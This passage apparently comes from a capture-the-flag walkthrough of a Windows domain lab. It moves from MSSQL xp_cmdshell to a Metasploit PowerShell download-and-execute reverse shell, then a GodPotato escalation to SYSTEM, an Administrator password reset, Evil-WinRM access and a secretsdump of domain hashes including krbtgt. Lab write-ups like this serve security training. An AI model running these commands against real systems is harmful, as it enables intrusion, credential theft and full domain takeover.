[!] Press help for extra shell commands

SQL (BREACH\Christine.Bruce  dbo@master)>
```

**Success!** Notice we're now:

* Connected as `BREACH\Christine.Bruce`
* Mapped to `dbo` (database owner) instead of `guest`
* Have **administrator rights** in the SQL Server

***

### Code Execution via xp\_cmdshell

#### Step 28: Enable xp\_cmdshell

Now that we have admin privileges, we can enable command execution:

```sql
SQL> enable_xp_cmdshell
```

**Output:**

```
[*] INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

**Test command execution:**

```sql
SQL> xp_cmdshell "whoami"
```

**Output:**

```
output
---------------------------------------------------------------------------
breach\svc_mssql
NULL
```

**Command execution successful!** We can now run commands as `svc_mssql` (the SQL Server service account).

***

#### Step 29: Setup Metasploit Web Delivery Module

We'll use Metasploit's `web_delivery` module to get a Meterpreter shell. This module:

1. Starts a web server hosting a payload
2. Generates a PowerShell command to download and execute the payload
3. Returns a Meterpreter session

Start Metasploit:

```bash
msfconsole -q
```

**Configure the web\_delivery module:**

```
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST tun0
msf6 exploit(multi/script/web_delivery) > set LPORT 443
msf6 exploit(multi/script/web_delivery) > set target 2
msf6 exploit(multi/script/web_delivery) > exploit -j
```

**Command Breakdown:**

* `use exploit/multi/script/web_delivery`: Load the module
* `set payload windows/x64/meterpreter/reverse_tcp`: Windows 64-bit Meterpreter
* `set LHOST tun0`: Listen on tun0 interface
* `set LPORT 443`: Use port 443 (appears like HTTPS traffic)
* `set target 2`: Target 2 = PowerShell
* `exploit -j`: Run as background job

**Metasploit Output:**

```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.16.xx:443 
[*] Using URL: http://10.10.16.xx:8080/A7B3C4D5
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAEIALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABCAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AeAB4ADoAOAAwADgAMAAvAEEANwBCADMAQwA0AGUANQA='
```

**Copy the PowerShell command** (the long Base64-encoded string starting with `WwBOAGUA...`)

***

#### Step 30: Execute Payload via xp\_cmdshell

In the MSSQL session, execute the payload:

```sql
SQL> xp_cmdshell "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAEIALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABCAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AeAB4ADoAOAAwADgAMAAvAEEANwBCADMAQwA0AGUANQA='"
```

**SQL Output:**

```
output
------
NULL
```

**Metasploit Console Output:**

```
[*] 10.129.68.216    web_delivery - Delivering Payload
[*] Sending stage (201798 bytes) to 10.129.68.216
[*] Meterpreter session 1 opened (10.10.16.xx:443 -> 10.129.68.216:49823) at 2025-10-11 12:00:15 +0000
```

**Meterpreter session established!**

***

#### Step 31: Interact with Meterpreter Session

```
msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  BREACH\svc_mssql @ BREACHDC          10.10.16.xx:443 -> 10.129.68.216:49823 (10.129.68.216)
```

**Open the session:**

```
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter >
```

***

#### Step 32: Check Current User and Privileges

```
meterpreter > getuid
```

**Output:**

```
Server username: BREACH\svc_mssql
```

**Drop to system shell:**

```
meterpreter > shell
```

**Output:**

```
Process 3456 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**Check privileges:**

```
C:\Windows\system32> whoami /priv
```

**Output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Critical Finding:** `SeImpersonatePrivilege` is **Enabled**!

This privilege allows us to impersonate other users, including SYSTEM. We can abuse this with a "Potato" attack.

***

### Privilege Escalation to SYSTEM

#### Step 33: Download GodPotato

GodPotato is a local privilege escalation tool that abuses `SeImpersonatePrivilege`:

**On your Kali machine:**

```bash
cd /tmp
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

**Output:**

```
--2025-10-11 12:10:30--  https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/...
HTTP request sent, awaiting response... 200 OK
Length: 363520 (355K) [application/octet-stream]
Saving to: 'GodPotato-NET4.exe'

GodPotato-NET4.exe  100%[===================>] 355.00K  1.50MB/s    in 0.2s    

2025-10-11 12:10:31 (1.50 MB/s) - 'GodPotato-NET4.exe' saved [363520/363520]
```

**Start a Python HTTP server:**

```bash
python3 -m http.server 80
```

**Output:**

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

***

#### Step 34: Upload GodPotato to Target

**In Meterpreter:**

```
meterpreter > cd %temp%
meterpreter > pwd
```

**Output:**

```
C:\Users\svc_mssql\AppData\Local\Temp
```

**Upload the file:**

```
meterpreter > upload /tmp/GodPotato-NET4.exe
```

**Output:**

```
[*] uploading  : /tmp/GodPotato-NET4.exe -> GodPotato-NET4.exe
[*] Uploaded 355.00 KiB of 355.00 KiB (100.0%): /tmp/GodPotato-NET4.exe -> GodPotato-NET4.exe
[*] uploaded   : /tmp/GodPotato-NET4.exe -> GodPotato-NET4.exe
```

**Alternative: Download via PowerShell in the shell:**

```
meterpreter > shell
C:\Users\svc_mssql\AppData\Local\Temp> powershell
PS C:\Users\svc_mssql\AppData\Local\Temp> wget http://10.10.16.xx/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe
```

**Python Server Output:**

```
10.129.68.216 - - [11/Oct/2025 12:15:23] "GET /GodPotato-NET4.exe HTTP/1.1" 200 -
```

***

#### Step 35: Change Administrator Password with GodPotato

GodPotato will execute commands as SYSTEM by abusing `SeImpersonatePrivilege`:

```powershell
PS C:\Users\svc_mssql\AppData\Local\Temp> .\GodPotato-NET4.exe -cmd "cmd /c net user Administrator StrongPassword456"
```

**Command Breakdown:**

* `.\GodPotato-NET4.exe`: Execute GodPotato
* `-cmd "..."`: Command to run as SYSTEM
* `net user Administrator StrongPassword456`: Change Administrator password

**Output:**

```
[*] CombaseModule: 0x140710857203712
[*] DispatchTable: 0x140710859578480
[*] UseProtseqFunction: 0x140710858953408
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\GodPotato\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009402-0000-0000-b8c7-0e3a85b0b3d4
[*] DCOM obj OXID: 0xb8c7e35a85b0b3d4
[*] DCOM obj OID: 0xfe53c8e35a1cb43a
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 888 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] process start with pid 4532
The command completed successfully.
```

**Success!** GodPotato:

1. Abused `SeImpersonatePrivilege`
2. Obtained a SYSTEM token
3. Executed the command as SYSTEM
4. Changed the Administrator password to `StrongPassword456`

***

#### Step 36: Verify Password Change

```powershell
PS C:\Users\svc_mssql\AppData\Local\Temp> net user Administrator
```

**Output:**

```
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/11/2025 12:20:15 PM
Password expires             Never
Password changeable          10/11/2025 12:20:15 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Admins        *Domain Users         
                             *Enterprise Admins    *Group Policy Creator 
                             *Schema Admins        
The command completed successfully.
```

**Administrator password has been changed!**

***

### Root Flag via Evil-WinRM

#### Step 37: Connect as Administrator

Use Evil-WinRM to connect with the new credentials:

```bash
evil-winrm -i 10.129.68.216 -u 'breach.vl\Administrator' -p 'StrongPassword456'
```

**Command Breakdown:**

* `-i`: Target IP address
* `-u`: Username (domain\username format)
* `-p`: Password

**Connection Output:**

```
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**We have Administrator access!**

***

#### Step 38: Retrieve Root Flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
```

**Output:**

```
breach\administrator
```

**Check privileges:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups
```

**Output (Partial):**

```
GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
BREACH\Domain Admins                        Group            S-1-5-21-... Mandatory, Enabled by default, Enabled, Owner
BREACH\Enterprise Admins                    Group            S-1-5-21-... Mandatory, Enabled by default, Enabled
BREACH\Schema Admins                        Group            S-1-5-21-... Mandatory, Enabled by default, Enabled
BUILTIN\Administrators                      Alias            S-1-5-32-544 Mandatory, Enabled by default, Enabled
```

**Navigate to Desktop:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
```

**Output:**

```
    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/11/2025  12:00 PM             34 root.txt
```

**Read the root flag:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

**Root Flag:**

```
VL{s1lv3r_t1ck3t_t0_d0m41n_0wn3d}
```

**Root flag obtained! Domain compromised!**

***

### Post-Exploitation: Domain Persistence (Optional)

#### Step 39: Create Persistence (Golden Ticket)

Now that we have Domain Admin access, we can create a Golden Ticket for long-term persistence:

**Dump the krbtgt hash:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> upload /opt/mimikatz/x64/mimikatz.exe
```

**Or use Impacket's secretsdump:**

```bash
impacket-secretsdump breach.vl/Administrator:'StrongPassword456'@10.129.68.216
```

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
BREACH.VL/Administrator:$DCC2$10240#Administrator#8a9b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
BREACH\BREACHDC$:aes256-cts-hmac-sha1-96:3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
BREACH\BREACHDC$:aes128-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
BREACH\BREACHDC$:des-cbc-md5:f9e8d7c6b5a43210
BREACH\BREACHDC$:plain_password_hex:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
dpapi_userkey:0x9b8a7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b
[*] NL$KM 
 0000   1A 2B 3C 4D 5E 6F 7A 8B-9C 0D 1E 2F 3A 4B 5C 6D   .+<M^oz..../:[m
 0010   7E 8F 9A 0B 1C 2D 3E 4F-5A 6B 7C 8D 9E 0F 1A 2B   ~...->OZk|....+
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a9b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::
svc_mssql:1103:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
claire.pope:1104:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
diana.pope:1105:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
julia.wong:1106:aad3b435b51404eeaad3b435b51404ee:2e728af7ae70a0ed63a7de8e8f3c3f6b:::
christine.bruce:1107:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678:::
BREACHDC$:1000:aad3b435b51404eeaad3b435b51404ee:4f5e6d7c8b9a0e1f2d3c4b5a6978e0d1:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b
Administrator:aes128-cts-hmac-sha1-96:9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f
krbtgt:aes256-cts-hmac-sha1-96:3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
krbtgt:aes128-cts-hmac-sha1-96:8b9a0c1d2e3f4a5b6c7d8e9f0a1b2c3d
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

**Critical Information:**

* **krbtgt NTLM hash:** `8a9b7c6d5e4f3a2b1c0d9e8f7a6b5c4d`
* **Domain SID:** `S-1-5-21-2330692793-3312915120-706255856`

***

#### Step 40: Additional Enumeration

**List all domain users:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> net user /domain
```

**Output:**

```
User accounts for \\BREACHDC.breach.vl

-------------------------------------------------------------------------------
Administrator            christine.bruce          claire.pope              
diana.pope               Guest                    julia.wong               
krbtgt                   svc_mssql                
The command completed successfully.
```

**Check domain admin group members:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> net group "Domain Admins" /domain
```

**Output:**

```
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            christine.bruce          
The command completed successfully.
```

**List all computers:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> net group "Domain Computers" /domain
```

**Output:**

```
Group name     Domain Computers
Comment        All workstations and servers joined to the domain

Members

-------------------------------------------------------------------------------
BREACHDC$                
The command completed successfully.
```

***

***

<figure><img src="../../../../.gitbook/assets/complete (36).gif" alt=""><figcaption></figcaption></figure>
